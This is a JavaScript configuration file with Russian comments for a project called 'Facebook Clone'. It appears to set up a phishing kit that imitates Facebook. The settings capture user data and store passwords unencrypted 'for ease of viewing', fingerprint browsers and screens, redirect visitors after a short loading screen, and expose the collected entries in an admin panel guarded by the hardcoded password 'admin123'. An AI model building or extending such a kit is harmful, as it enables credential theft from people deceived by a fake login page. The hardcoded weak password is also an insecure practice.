// config.js - исправленная версия
const CONFIG = {
    PROJECT_NAME: 'Facebook Clone',
    VERSION: '2.0 (Fixed)',
    
    // НАСТРОЙКИ СБОРА ДАННЫХ - ВСЕ ВКЛЮЧЕНО
    COLLECT_DATA: true,
    SAVE_TO_LOCALSTORAGE: true,
    SAVE_TO_FILE: false,
    SEND_TO_SERVER: false,
    SERVER_URL: '',
    
    // НАСТРОЙКИ БЕЗОПАСНОСТИ
    ENCRYPT_PASSWORDS: false, // Отключено для простоты просмотра
    MAX_LOG_ENTRIES: 1000,
    
    // НАСТРОЙКИ ИНТЕРФЕЙСА - УМЕНЬШЕНЫ ЗАДЕРЖКИ
    REDIRECT_DELAY: 1500, // 1.5 секунды вместо 2
    LOADING_DISPLAY_TIME: 1000, // 1 секунда
    
    // АДМИНКА
    ADMIN_PASSWORD: 'admin123', // Стандартный пароль
    AUTO_REFRESH_DATA: true,
    REFRESH_INTERVAL: 3000, // 3 секунды
    
    // СБОР ИНФОРМАЦИИ
    COLLECT_BROWSER_INFO: true,
    COLLECT_SCREEN_INFO: true,
    COLLECT_LOCATION_INFO: false,
    
    // РЕЖИМ ОТЛАДКИ
    DEBUG_MODE: true,
    
    // ФИКС ДЛЯ РЕГИСТРАЦИИ
    AUTO_CREATE_ACCOUNT: true,
    DEFAULT_EMAIL_DOMAIN: '@facebook.com'
};

// Экспортируем конфиг
window.CONFIG = CONFIG;

// Для быстрой проверки в консоли
console.log('CONFIG loaded:', CONFIG.PROJECT_NAME, 'v' + CONFIG.VERSION);
